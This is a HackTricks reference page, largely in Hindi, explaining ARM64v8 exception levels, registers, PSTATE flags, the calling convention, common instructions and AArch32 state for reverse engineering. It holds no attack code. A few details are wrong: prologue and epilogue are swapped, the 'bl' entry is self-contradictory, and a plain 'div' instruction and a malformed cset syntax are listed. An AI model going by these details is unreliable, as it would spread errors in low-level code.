# ARM64v8 का परिचय

{{#include ../../../banners/hacktricks-training.md}}

## **Exception Levels - EL (ARM64v8)**

ARMv8 आर्किटेक्चर में, execution levels जिन्हें Exception Levels (ELs) कहा जाता है, execution environment के privilege स्तर और क्षमताओं को परिभाषित करते हैं। चार exception levels होते हैं, जो EL0 से EL3 तक होते हैं, और प्रत्येक का अलग उद्देश्य होता है:

1. **EL0 - User Mode**:
- यह सबसे कम-privileged स्तर है और सामान्य application code के निष्पादन के लिए उपयोग किया जाता है।
- EL0 पर चलने वाले एप्लिकेशन एक-दूसरे और सिस्टम सॉफ़्टवेयर से अलग होते हैं, जिससे सुरक्षा और स्थिरता बढ़ती है।
2. **EL1 - Operating System Kernel Mode**:
- अधिकांश operating system kernels इस स्तर पर चलते हैं।
- EL1 में EL0 की तुलना में अधिक privileges होते हैं और यह system resources तक पहुंच सकता है, लेकिन सिस्टम अखंडता सुनिश्चित करने के लिए कुछ प्रतिबंध होते हैं।
3. **EL2 - Hypervisor Mode**:
- यह स्तर virtualization के लिए उपयोग किया जाता है। EL2 पर चलने वाला hypervisor एक ही भौतिक हार्डवेयर पर कई operating systems (प्रत्येक अपने EL1 में) को प्रबंधित कर सकता है।
- EL2 virtualized environments के isolation और नियंत्रण की सुविधाएँ प्रदान करता है।
4. **EL3 - Secure Monitor Mode**:
- यह सबसे अधिक privileged स्तर है और अक्सर secure booting और trusted execution environments के लिए उपयोग किया जाता है।
- EL3 secure और non-secure राज्यों (जैसे secure boot, trusted OS आदि) के बीच पहुँच और नियंत्रण को प्रबंधित कर सकता है।

इन स्तरों के उपयोग से सिस्टम के विभिन्न पहलुओं को संरचित और सुरक्षित तरीके से प्रबंधित करने की अनुमति मिलती है, उपयोगकर्ता अनुप्रयोगों से लेकर सबसे privileged सिस्टम सॉफ़्टवेयर तक। ARMv8 का यह privilege स्तर का दृष्टिकोण विभिन्न सिस्टम घटकों को प्रभावी ढंग से अलग करने में मदद करता है, जिससे सिस्टम की सुरक्षा और मजबूती बढ़ती है।

## **Registers (ARM64v8)**

ARM64 में **31 general-purpose registers** होते हैं, जिन्हें `x0` से `x30` लेबल किया गया है। प्रत्येक में **64-bit** (8-बाइट) मान संग्रहीत हो सकता है। उन ऑपरेशनों के लिए जो केवल 32-bit मान की आवश्यकता होती है, वही registers 32-bit मोड में `w0` से `w30` नामों से एक्सेस किए जा सकते हैं।

1. **`x0`** से **`x7`** - ये आम तौर पर scratch registers और subroutines को पैरामीटर पास करने के लिए उपयोग किए जाते हैं।
- **`x0`** एक फ़ंक्शन के return data को भी वहन करता है
2. **`x8`** - Linux kernel में, `x8` का उपयोग `svc` instruction के लिए system call number के रूप में किया जाता है। **In macOS the x16 is the one used!**
3. **`x9`** से **`x15`** - और अधिक temporary registers, अक्सर local variables के लिए उपयोग किए जाते हैं।
4. **`x16`** और **`x17`** - **Intra-procedural Call Registers**। Immediate मानों के लिए temporary registers। इन्हें indirect function calls और PLT (Procedure Linkage Table) stubs के लिए भी उपयोग किया जाता है।
- **`x16`** को **macOS** में **`svc`** instruction के लिए **system call number** के रूप में उपयोग किया जाता है।
5. **`x18`** - **Platform register**। इसे सामान्य प्रयोजन के रूप में उपयोग किया जा सकता है, लेकिन कुछ प्लेटफार्मों पर यह प्लेटफार्म-विशिष्ट उपयोगों के लिए आरक्षित होता है: Windows में current thread environment block का pointer, या linux kernel में वर्तमान **executing task structure** की ओर पॉइंट करने के लिए।
6. **`x19`** से **`x28`** - ये callee-saved registers हैं। एक फ़ंक्शन को इन registers के मानों को उसके caller के लिए संरक्षित रखना चाहिए, इसलिए इन्हें stack में सेव किया जाता है और caller को लौटने से पहले पुनर्स्थापित किया जाता है।
7. **`x29`** - **Frame pointer** जो stack frame का ट्रैक रखने के लिए होता है। जब किसी फ़ंक्शन के कॉल होने पर नया stack frame बनता है, तो **`x29`** register **stack में संग्रहीत** किया जाता है और नया frame pointer address (जो कि **`sp`** address होता है) इस register में **संग्रहीत** किया जाता है।
- यह register सामान्य प्रयोजन के रूप में भी उपयोग किया जा सकता है हालाँकि इसे आमतौर पर **local variables** के संदर्भ के रूप में उपयोग किया जाता है।
8. **`x30`** या **`lr`** - **Link register**। यह `BL` (Branch with Link) या `BLR` (Branch with Link to Register) instruction निष्पादित होने पर **return address** रखता है क्योंकि यह register में **`pc`** मान संग्रहीत कर देता है।
- इसे किसी अन्य register की तरह भी उपयोग किया जा सकता है।
- यदि वर्तमान फ़ंक्शन एक नए फ़ंक्शन को कॉल करने वाला है और इसलिए `lr` overwrite हो जाएगा, तो यह इसे शुरुआत में stack में संग्रहीत करेगा, यह epilogue (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Store `fp` and `lr`, generate space and get new `fp`) है और अंत में इसे पुनर्प्राप्त करता है, यह prologue (`ldp x29, x30, [sp], #48; ret` -> Recover `fp` and `lr` and return`) है।
9. **`sp`** - **Stack pointer**, जो stack के शीर्ष का ट्रैक रखने के लिए उपयोग होता है।
- **`sp`** मान को हमेशा कम से कम एक **quadword** **alignment** में रखा जाना चाहिए अन्यथा alignment exception हो सकती है।
10. **`pc`** - **Program counter**, जो अगले instruction की ओर इशारा करता है। इस register को केवल exception generation, exception returns, और branches के माध्यम से ही अपडेट किया जा सकता है। सामान्य instructions में केवल branch with link instructions (BL, BLR) ही इस register को पढ़ सकते हैं ताकि वे **`pc`** address को **`lr`** (Link Register) में स्टोर कर सकें।
11. **`xzr`** - **Zero register**। 32-बिट register स्वरूप में इसे **`wzr`** भी कहा जाता है। इसे zero मान आसानी से प्राप्त करने के लिए उपयोग किया जा सकता है (सामान्य ऑपरेशन) या तुलना करने के लिए `subs` जैसी instructions में परिणाम को कहीं स्टोर न करने के लिए उपयोग किया जा सकता है (उदा. **`subs XZR, Xn, #10`**).

**`Wn`** registers **`Xn`** register का **32bit** संस्करण हैं।

> [!TIP]
> Registers from X0 - X18 volatile होते हैं, जिसका अर्थ है कि उनका मान function calls और interrupts द्वारा बदला जा सकता है। हालाँकि, registers from X19 - X28 non-volatile हैं, यानी इनके मानों को function calls के दौरान संरक्षित रखना होगा ("callee saved")।

### SIMD and Floating-Point Registers

इसके अलावा, और भी **32 registers of 128bit length** हैं जो optimized single instruction multiple data (SIMD) operations और floating-point arithmetic के लिए उपयोग किए जा सकते हैं। इन्हें Vn registers कहा जाता है हालाँकि इन्हें **64**-bit, **32**-bit, **16**-bit और **8**-bit मोड में भी चलाया जा सकता है और तब इन्हें **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** और **`Bn`** कहा जाता है।

### System Registers

**There are hundreds of system registers**, जिन्हें special-purpose registers (SPRs) भी कहा जाता है, processors के व्यवहार की **monitoring** और **controlling** के लिए उपयोग किए जाते हैं.\
इन्हें केवल समर्पित special instructions **`mrs`** और **`msr`** का उपयोग करके पढ़ा या सेट किया जा सकता है।

विशेष registers **`TPIDR_EL0`** और **`TPIDDR_EL0`** reversing engineering में अक्सर मिलते हैं। `EL0` suffix दर्शाता है कि यह register किस न्यूनतम exception स्तर से एक्सेस किया जा सकता है (इस मामले में EL0 वह नियमित exception (privilege) स्तर है जिस पर सामान्य प्रोग्राम चलते हैं)।\
इनका अक्सर उपयोग thread-local storage क्षेत्र के base address को store करने के लिए किया जाता है। आमतौर पर पहला readable और writable होता है programs द्वारा जो EL0 में चल रहे हैं, लेकिन दूसरा EL0 से पढ़ा जा सकता है और EL1 (kernel) से लिखा जा सकता है।

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** में कई process घटक होते हैं जो operating-system-visible **`SPSR_ELx`** special register में serialized होते हैं, जहाँ X triggered exception का **permission** **level** होता है (यह exception समाप्त होने पर process state को पुनर्प्राप्त करने की अनुमति देता है)।\
ये पहुँच योग्य fields हैं:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- The **`N`**, **`Z`**, **`C`** और **`V`** condition flags:
- **`N`** मतलब ऑपरेशन का परिणाम नकारात्मक हुआ
- **`Z`** मतलब ऑपरेशन शून्य हुआ
- **`C`** मतलब ऑपरेशन में carry हुआ
- **`V`** मतलब ऑपरेशन में signed overflow हुआ:
- दो सकारात्मक संख्याओं के जोड़ से नकारात्मक परिणाम होना।
- दो नकारात्मक संख्याओं के जोड़ से सकारात्मक परिणाम होना।
- घटाव में, जब एक बड़ा नकारात्मक नंबर एक छोटे सकारात्मक नंबर से घटाया जाता है (या इसके विपरीत), और परिणाम दिए गए बिट आकार की सीमा में प्रदर्शित नहीं किया जा सकता।
- स्पष्ट रूप से processor यह नहीं जानता कि ऑपरेशन signed है या नहीं, इसलिए यह operations में C और V की जाँच करेगा और बताएगा कि carry हुआ या नहीं चाहे वह signed या unsigned हो।

> [!WARNING]
> सभी instructions इन flags को अपडेट नहीं करते। कुछ जैसे **`CMP`** या **`TST`** करते हैं, और अन्य जिनके अंत में s लगा होता है जैसे **`ADDS`** भी करते हैं।

- वर्तमान **register width (`nRW`) flag**: यदि यह flag 0 रखता है, तो प्रोग्राम AArch64 execution state में resumed होने पर चलेगा।
- वर्तमान **Exception Level** (**`EL`**): EL0 में चल रहा सामान्य प्रोग्राम का मान 0 होगा
- **single stepping** flag (**`SS`**): Debuggers द्वारा single step करने के लिए उपयोग किया जाता है—exception के माध्यम से **`SPSR_ELx`** के अंदर SS flag को 1 सेट करके। प्रोग्राम एक step चलाएगा और एक single step exception जारी करेगा।
- **illegal exception** state flag (**`IL`**): यह तब मार्क करने के लिए उपयोग किया जाता है जब कोई privileged सॉफ़्टवेयर invalid exception level transfer करता है, यह flag 1 पर सेट हो जाता है और processor एक illegal state exception ट्रिगर करता है।
- **`DAIF`** flags: ये flags privileged प्रोग्राम को कुछ external exceptions को selective रूप से mask करने की अनुमति देते हैं।
- यदि **`A`** 1 है तो इसका मतलब है कि **asynchronous aborts** ट्रिगर होंगे। **`I`** external hardware **Interrupts Requests** (IRQs) का जवाब देने के लिए configure करता है। और **F** का संबंध **Fast Interrupt Requests** (FIRs) से है।
- **stack pointer select** flags (**`SPS`**): EL1 और उससे ऊपर चल रहे privileged प्रोग्राम अपने स्वयं के stack pointer register और user-model वाले के बीच swap कर सकते हैं (उदा. `SP_EL1` और `EL0`)। यह switching **`SPSel`** special register में लिखकर किया जाता है। इसे EL0 से नहीं किया जा सकता।

## **Calling Convention (ARM64v8)**

ARM64 calling convention निर्दिष्ट करता है कि किसी फ़ंक्शन के पहले आठ पैरामीटर registers **`x0` से `x7`** में पास किए जाते हैं। अतिरिक्त पैरामीटर **stack** पर पास किए जाते हैं। return value register **`x0`** में वापस की जाती है, या यदि यह 128 बिट लंबी है तो **`x1`** में भी। **`x19`** से **`x30`** और **`sp`** registers को function calls के दौरान **preserve** किया जाना चाहिए।

यदि आप assembly में किसी फ़ंक्शन को पढ़ रहे हैं, तो फ़ंक्शन prologue और epilogue की तलाश करें। **prologue** आम तौर पर **frame pointer (`x29`) को सुरक्षित करना**, **नया frame pointer सेट करना**, और **stack space allocate करना** शामिल करता है। **epilogue** आम तौर पर **saved frame pointer को पुनर्स्थापित करना** और फ़ंक्शन से **return** करना शामिल करता है।

### Calling Convention in Swift

Swift की अपनी **calling convention** है जिसे आप [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64) पर देख सकते हैं

## **Common Instructions (ARM64v8)**

ARM64 instructions सामान्यतः **`opcode dst, src1, src2`** प्रारूप में होते हैं, जहाँ **`opcode`** वह ऑपरेशन होता है जिसे निष्पादित किया जाना है (जैसे `add`, `sub`, `mov`, आदि), **`dst`** वह destination register है जहाँ परिणाम संग्रहित होगा, और **`src1`** तथा **`src2`** source registers होते हैं। Immediate मान भी source registers की जगह उपयोग किए जा सकते हैं।

- **`mov`**: एक मान को एक **register** से दूसरे में **Move** करना।
- उदाहरण: `mov x0, x1` — यह `x1` से मान को `x0` में ले जाता है।
- **`ldr`**: **Load** करना memory से एक मान को register में।
- उदाहरण: `ldr x0, [x1]` — यह `x1` द्वारा संकेतित memory location से मान को `x0` में लोड करता है।
- **Offset mode**: एक offset जो origin pointer को प्रभावित करता है, उदाहरण के लिए:
- `ldr x2, [x1, #8]`, यह x2 में x1 + 8 से मान लोड करेगा
- `ldr x2, [x0, x1, lsl #2]`, यह x2 में array x0 से object लोड करेगा, position x1 (index) * 4 से
- **Pre-indexed mode**: यह origin पर calculation लागू करेगा, परिणाम प्राप्त करेगा और नया origin भी origin में स्टोर करेगा।
- `ldr x2, [x1, #8]!`, यह `x1 + 8` को `x2` में लोड करेगा और x1 में `x1 + 8` का परिणाम स्टोर करेगा
- `str lr, [sp, #-4]!`, link register को sp में स्टोर करें और register sp को update करें
- **Post-index mode**: यह पिछले जैसा है पर memory address पहले एक्सेस किया जाता है और फिर offset की गणना की जाती है और स्टोर किया जाता है।
- `ldr x0, [x1], #8`, `x1` को `x0` में लोड करें और x1 को `x1 + 8` से अपडेट करें
- **PC-relative addressing**: इस मामले में load करने के लिए address PC register के सापेक्ष गणना की जाती है
- `ldr x1, =_start`, यह वर्तमान PC से संबंधित `_start` symbol के स्थान का address `x1` में लोड करेगा।
- **`str`**: एक मान को **register** से **memory** में **Store** करना।
- उदाहरण: `str x0, [x1]` — यह `x0` में मौजूद मान को `x1` द्वारा संकेतित memory location में स्टोर करता है।
- **`ldp`**: **Load Pair of Registers**। यह instruction लगातार memory locations से दो registers लोड करती है। memory address आमतौर पर किसी अन्य register के मान में offset जोड़कर बनाया जाता है।
- उदाहरण: `ldp x0, x1, [x2]` — यह `x0` और `x1` को memory locations at `x2` और `x2 + 8` से लोड करता है।
- **`stp`**: **Store Pair of Registers**। यह instruction लगातार memory locations में दो registers स्टोर करती है। memory address आमतौर पर किसी अन्य register के मान में offset जोड़कर बनाया जाता है।
- उदाहरण: `stp x0, x1, [sp]` — यह `x0` और `x1` को memory locations at `sp` और `sp + 8` में स्टोर करता है।
- `stp x0, x1, [sp, #16]!` — यह `x0` और `x1` को memory locations at `sp+16` और `sp + 24` में स्टोर करता है, और `sp` को `sp+16` से अपडेट करता है।
- **`add`**: दो registers के मानों को जोड़ना और परिणाम को एक register में स्टोर करना।
- Syntax: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Destination
- Xn2 -> Operand 1
- Xn3 | #imm -> Operand 2 (register या immediate)
- \[shift #N | RRX] -> Shift perform करें या RRX कॉल करें
- उदाहरण: `add x0, x1, x2` — यह `x1` और `x2` के मानों को जोड़कर परिणाम `x0` में स्टोर करेगा।
- `add x5, x5, #1, lsl #12` — यह 4096 के बराबर है (1 को 12 बार shift करना) -> 1 0000 0000 0000 0000
- **`adds`** यह `add` करता है और flags को अपडेट करता है
- **`sub`**: दो registers के मानों को घटाना और परिणाम को एक register में स्टोर करना।
- Syntax के लिए **`add`** देखें।
- उदाहरण: `sub x0, x1, x2` — यह `x2` के मान को `x1` से घटाकर परिणाम `x0` में स्टोर करता है।
- **`subs`** यह sub जैसा है पर flags को अपडेट करता है
- **`mul`**: दो registers के मानों का गुणा करना और परिणाम को एक register में स्टोर करना।
- उदाहरण: `mul x0, x1, x2` — यह `x1` और `x2` के मानों को गुणा करके परिणाम `x0` में स्टोर करेगा।
- **`div`**: एक register के मान को दूसरे से विभाजित करना और परिणाम को एक register में स्टोर करना।
- उदाहरण: `div x0, x1, x2` — यह `x1` को `x2` से विभाजित करके परिणाम `x0` में स्टोर करता है।
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: अंत से 0 जोड़ना और बाकी bits को आगे ले जाना (n-गुना 2 से गुणा)
- **Logical shift right**: शुरुआत में 1s जोड़ना नहीं बल्कि 0s जोड़ना जो bits को पीछे ले जाता है (unsigned में n-गुना 2 से विभाजन)
- **Arithmetic shift right**: **`lsr`** जैसा, पर यदि most significant bit 1 हो तो 1s जोड़े जाते हैं (signed में n-गुना 2 से विभाजन)
- **Rotate right**: **`lsr`** जैसा, पर जो हटता है उसे बाईं ओर जोड़ दिया जाता है
- **Rotate Right with Extend**: **`ror`** जैसा, पर carry flag को "most significant bit" के रूप में उपयोग करता है। तो carry flag bit 31 में चला जाता है और हटाया गया bit carry flag में चला जाता है।
- **`bfm`**: **Bit Filed Move**, ये ऑपरेशन किसी मान से bits `0...n` को copy करते हैं और उन्हें positions **`m..m+n`** में रखते हैं। **`#s`** leftmost bit position दर्शाता है और **`#r`** rotate right मात्रा दर्शाता है।
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** एक register से bitfield copy करके दूसरे register में copy करना।
- **`BFI X1, X2, #3, #4`** X2 के 3rd bit से 4 bits X1 में insert करें
- **`BFXIL X1, X2, #3, #4`** X2 के 3rd bit से चार bits निकालें और उन्हें X1 में कॉपी करें
- **`SBFIZ X1, X2, #3, #4`** X2 के 4 bits sign-extend करके X1 में bit position 3 से insert करें और दाईं ओर की बिट्स को zero करें
- **`SBFX X1, X2, #3, #4`** X2 के bit 3 से शुरू होने वाले 4 bits को निकालता है, sign extend करता है, और परिणाम X1 में रखता है
- **`UBFIZ X1, X2, #3, #4`** X2 के 4 bits को zero-extend करके X1 में bit position 3 से insert करता है और दाईं ओर की बिट्स को zero करता है
- **`UBFX X1, X2, #3, #4`** X2 के bit 3 से शुरू होने वाले 4 bits को निकालता है और zero-extended परिणाम X1 में रखता है।
- **Sign Extend To X:** किसी मान के sign को बढ़ाना (या unsigned में 0s जोड़ना) ताकि उस पर operations किए जा सकें:
- **`SXTB X1, W2`** W2 से एक byte का sign extend करके **W2 से X1** (यह `W2` `X2` का आधा है) 64bits भरता है
- **`SXTH X1, W2`** 16bit संख्या का sign extend करके **W2 से X1** 64bits भरता है
- **`SXTW X1, W2`** एक byte का sign extend करके **W2 से X1** 64bits भरता है
- **`UXTB X1, W2`** unsigned में 0s जोड़कर एक byte **W2 से X1** में 64bits भरता है
- **`extr`:** किसी निर्दिष्ट जोड़ी के registers को concatenated मानकर bits निकालता है।
- उदाहरण: `EXTR W3, W2, W1, #3` यह **W1+W2** को concat करेगा और **W2 के bit 3 से लेकर W1 के bit 3 तक** ले कर उसे W3 में स्टोर करेगा।
- **`cmp`**: दो registers की तुलना करता है और condition flags सेट करता है। यह `subs` का एक alias है जो destination register को zero register सेट करता है। यह उपयोगी है यह जानने के लिए कि `m == n`।
- यह `subs` जैसी ही syntax का समर्थन करता है
- उदाहरण: `cmp x0, x1` — यह `x0` और `x1` के मानों की तुलना करता है और condition flags सेट करता है।
- **`cmn`**: Compare negative operand। यह `adds` का alias है और वही syntax सपोर्ट करता है। यह उपयोगी है यह जानने के लिए कि `m == -n`।
- **`ccmp`**: Conditional comparison, यह तुलना केवल तब की जाएगी जब पिछली तुलना true थी और यह विशेष रूप से nzcv bits सेट करेगा।
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> अगर x1 != x2 और x3 < x4, तो func पर jump करें
- इसका कारण है कि **`ccmp`** केवल तभी निष्पादित होगा जब पिछला `cmp` एक `NE` था, यदि ऐसा नहीं था तो bits `nzcv` को 0 पर सेट कर दिया जाएगा (जो `blt` तुलना को संतुष्ट नहीं करेगा)।
- इसे `ccmn` के रूप में भी इस्तेमाल किया जा सकता है (वही पर negative, जैसे `cmp` बनाम `cmn`)।
- **`tst`**: यह जाँचता है कि तुलना के मानों में से किसी का भी bit 1 है या नहीं (यह ANDS जैसा काम करता है बिना परिणाम को कहीं स्टोर किए)। यह किसी register को किसी मान के साथ जाँचने और यह देखने के लिए उपयोगी है कि register में निर्दिष्ट value के किसी भी bit का मान 1 है या नहीं।
- उदाहरण: `tst X1, #7` जांचें कि X1 के अंतिम 3 bits में से कोई भी 1 है या नहीं
- **`teq`**: XOR ऑपरेशन है जो परिणाम को discard कर देता है
- **`b`**: Unconditional Branch
- उदाहरण: `b myFunction`
- ध्यान दें कि यह link register में return address नहीं भरेगा (subroutine calls के लिए जो वापस लौटना आवश्यक है, यह उपयुक्त नहीं है)
- **`bl`**: **Branch** with link, subroutine को कॉल करने के लिए उपयोग किया जाता है। यह **return address** को **`x30`** में स्टोर करता है।
- उदाहरण: `bl myFunction` — यह function `myFunction` को कॉल करता है और return address को `x30` में स्टोर करता है।
- ध्यान दें कि यह link register में return address नहीं भरेगा (subroutine calls के लिए जो वापस लौटना आवश्यक है, यह उपयुक्त नहीं है)
- **`blr`**: **Branch** with Link to Register, subroutine को कॉल करने के लिए उपयोग की जाती है जहाँ लक्ष्य एक register में निर्दिष्ट होता है। यह return address को `x30` में स्टोर करता है। (यह)
- उदाहरण: `blr x1` — यह उस फ़ंक्शन को कॉल करता है जिसका address `x1` में है और return address को `x30` में स्टोर करता है।
- **`ret`**: subroutine से **Return**, सामान्यतः **`x30`** में मौजूद address का उपयोग करते हुए।
- उदाहरण: `ret` — यह वर्तमान subroutine से `x30` में मौजूद return address का उपयोग करके लौटता है।
- **`b.<cond>`**: Conditional branches
- **`b.eq`**: **Branch if equal**, पिछली `cmp` instruction पर आधारित।
- उदाहरण: `b.eq label` — यदि पिछली `cmp` instruction ने दो मानों को equal पाया, तो यह `label` पर जंप करेगा।
- **`b.ne`**: **Branch if Not Equal**। यह instruction condition flags की जाँच करती है (जो पिछली comparison instruction द्वारा सेट किए गए थे), और यदि तुलना किए गए मान समान नहीं थे, तो यह label या address पर branch करेगा।
- उदाहरण: `cmp x0, x1` के बाद, `b.ne label` — यदि `x0` और `x1` के मान समान नहीं थे, तो यह `label` पर जंप करेगा।
- **`cbz`**: **Compare and Branch on Zero**। यह instruction किसी register की तुलना शून्य से करती है, और यदि वे समान हैं, तो यह label या address पर branch करती है।
- उदाहरण: `cbz x0, label` — यदि `x0` का मान शून्य है, तो यह `label` पर जंप करेगा।
- **`cbnz`**: **Compare and Branch on Non-Zero**। यह instruction किसी register की तुलना शून्य से करती है, और यदि वे समान नहीं हैं, तो यह label या address पर branch करती है।
- उदाहरण: `cbnz x0, label` — यदि `x0` का मान शून्य नहीं है, तो यह `label` पर जंप करेगा।
- **`tbnz`**: Test bit and branch on nonzero
- उदाहरण: `tbnz x0, #8, label`
- **`tbz`**: Test bit and branch on zero
- उदाहरण: `tbz x0, #8, label`
- **Conditional select operations**: ये ऑपरेशंस उनके conditional bits के आधार पर व्यवहार बदलते हैं।
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> अगर true है तो X0 = X1, अगर false है तो X0 = X2
- `csinc Xd, Xn, Xm, cond` -> अगर true है तो Xd = Xn, अगर false है तो Xd = Xm + 1
- `cinc Xd, Xn, cond` -> अगर true है तो Xd = Xn + 1, अगर false है तो Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> अगर true है तो Xd = Xn, अगर false है तो Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> अगर true है तो Xd = NOT(Xn), अगर false है तो Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> अगर true है तो Xd = Xn, अगर false है तो Xd = - Xm
- `cneg Xd, Xn, cond` -> अगर true है तो Xd = - Xn, अगर false है तो Xd = Xn
- `cset Xd, Xn, Xm, cond` -> अगर true है तो Xd = 1, अगर false है तो Xd = 0
- `csetm Xd, Xn, Xm, cond` -> अगर true है तो Xd = \<all 1>, अगर false है तो Xd = 0
- **`adrp`**: किसी symbol का **page address** compute करना और उसे एक register में store करना।
- उदाहरण: `adrp x0, symbol` — यह `symbol` का page address compute करता है और उसे `x0` में स्टोर करता है।
- **`ldrsw`**: memory से signed **32-bit** मान load करना और उसे **64** bit में sign-extend करना।
- उदाहरण: `ldrsw x0, [x1]` — यह `x1` द्वारा संकेतित memory location से signed 32-bit मान लोड करता है, उसे 64 बिट में sign-extend कर के `x0` में संग्रहीत कर देता है।
- **`stur`**: offset के साथ किसी अन्य register से एक memory location पर register मान को store करना।
- उदाहरण: `stur x0, [x1, #4]` — यह `x0` का मान उस memory address में स्टोर करता है जो वर्तमान में `x1` के address से 4 bytes बड़ा है।
- **`svc`** : System call बनाना। इसका पूरा नाम "Supervisor Call" है। जब processor इस instruction को निष्पादित करता है, तो यह **user mode से kernel mode** में स्विच करता है और उस memory location पर कूदता है जहाँ kernel का system call handling code स्थित होता है।

- उदाहरण:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Function Prologue**

1. **Save the link register and frame pointer to the stack**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **नए frame pointer को सेट करें**: `mov x29, sp` (वर्तमान फ़ंक्शन के लिए नया frame pointer सेट करता है)
3. **स्टैक पर local variables के लिए जगह आरक्षित करें** (यदि आवश्यक): `sub sp, sp, <size>` (जहाँ `<size>` आवश्यक बाइट्स की संख्या है)

### **Function Epilogue**

1. **यदि कोई local variables अलोकेट किए गए थे तो उन्हें डिअलोकेट करें**: `add sp, sp, <size>`
2. **link register और frame pointer को पुनर्स्थापित करें**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **वापसी**: `ret` (लिंक रजिस्टर में मौजूद address का उपयोग करके caller को नियंत्रण वापस करता है)

## AARCH32 निष्पादन स्थिति

Armv8-A 32-bit प्रोग्रामों के निष्पादन का समर्थन करता है। **AArch32** दो **निर्देश सेट** में से किसी एक में चल सकता है: **`A32`** और **`T32`**, और इनके बीच **`interworking`** के माध्यम से स्विच कर सकता है.\
**Privileged** 64-bit प्रोग्राम कम privileges वाले 32-bit पर exception level transfer करके **32-bit प्रोग्रामों के निष्पादन** को schedule कर सकते हैं.\
ध्यान दें कि 64-bit से 32-bit में संक्रमण एक निचले exception level पर होता है (उदाहरण के लिए EL1 में चल रहा 64-bit प्रोग्राम EL0 में एक प्रोग्राम trigger करता है)। यह तब किया जाता है जब `AArch32` process thread execute करने के लिए तैयार होता है: special register **`SPSR_ELx`** का **bit 4** को **1** पर सेट किया जाता है और `SPSR_ELx` का शेष भाग `AArch32` प्रोग्राम का CPSR संग्रहीत करता है। इसके बाद, privileged process **`ERET`** instruction को कॉल करता है ताकि processor **`AArch32`** में transition कर सके और CPSR के अनुसार A32 या T32 में प्रवेश करे।

The **`interworking`** occurs using the J and T bits of CPSR. `J=0` and `T=0` means **`A32`** and `J=0` and `T=1` means **T32**. This basically traduces on setting the **lowest bit to 1** to indicate the instruction set is T32.\
यह **interworking branch instructions,** के दौरान सेट होता है, लेकिन PC को destination register के रूप में सेट करने पर अन्य instructions के साथ भी सीधे सेट किया जा सकता है। Example:

Another example:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registers

There are 16 32-bit registers (r0-r15). **From r0 to r14** they can be used for **any operation**, however some of them are usually reserved:

- **`r15`**: Program counter (always). Contains the address of the next instruction. In A32 current + 8, in T32, current + 4.
- **`r11`**: Frame Pointer
- **`r12`**: Intra-procedural call register
- **`r13`**: Stack Pointer (Note the stack is always 16-byte aligned)
- **`r14`**: Link Register

Moreover, registers are backed up in **`banked registries`**. Which are places that store the registers values allowing to perform **fast context switching** in exception handling and privileged operations to avoid the need to manually save and restore registers every time.\
This is done by **saving the processor state from the `CPSR` to the `SPSR`** of the processor mode to which the exception is taken. On the exception returns, the **`CPSR`** is restored from the **`SPSR`**.

### CPSR - वर्तमान प्रोग्राम स्टेटस रजिस्टर

In AArch32 the CPSR works similar to **`PSTATE`** in AArch64 and is also stored in **`SPSR_ELx`** when a exception is taken to restore later the execution:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

The fields are divided in some groups:

- Application Program Status Register (APSR): Arithmetic flags and accesible from EL0
- Execution State Registers: Process behaviour (managed by the OS).

#### Application Program Status Register (APSR)

- The **`N`**, **`Z`**, **`C`**, **`V`** flags (just like in AArch64)
- The **`Q`** flag: It's set to 1 whenever **integer saturation occurs** during the execution of a specialized saturating arithmetic instruction. Once it's set to **`1`**, it'll maintain the value until it's manually set to 0. Moreover, there isn't any instruction that checks its value implicitly, it must be done reading it manually.
- **`GE`** (Greater than or equal) Flags: It's used in SIMD (Single Instruction, Multiple Data) operations, such as "parallel add" and "parallel subtract". These operations allow processing multiple data points in a single instruction.

For example, the **`UADD8`** instruction **adds four pairs of bytes** (from two 32-bit operands) in parallel and stores the results in a 32-bit register. It then **sets the `GE` flags in the `APSR`** based on these results. Each GE flag corresponds to one of the byte additions, indicating if the addition for that byte pair **overflowed**.

The **`SEL`** instruction uses these GE flags to perform conditional actions.

#### Execution State Registers

- The **`J`** and **`T`** bits: **`J`** should be 0 and if **`T`** is 0 the instruction set A32 is used, and if it's 1, the T32 is used.
- **IT Block State Register** (`ITSTATE`): These are the bits from 10-15 and 25-26. They store conditions for instructions inside an **`IT`** prefixed group.
- **`E`** bit: Indicates the **endianness**.
- **Mode and Exception Mask Bits** (0-4): They determine the current execution state. The **5th** one indicates if the program runs as 32bit (a 1) or 64bit (a 0). The other 4 represents the **exception mode currently in used** (when a exception occurs and it's being handled). The number set **indicates the current priority** in case another exception is triggered while this is being handled.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

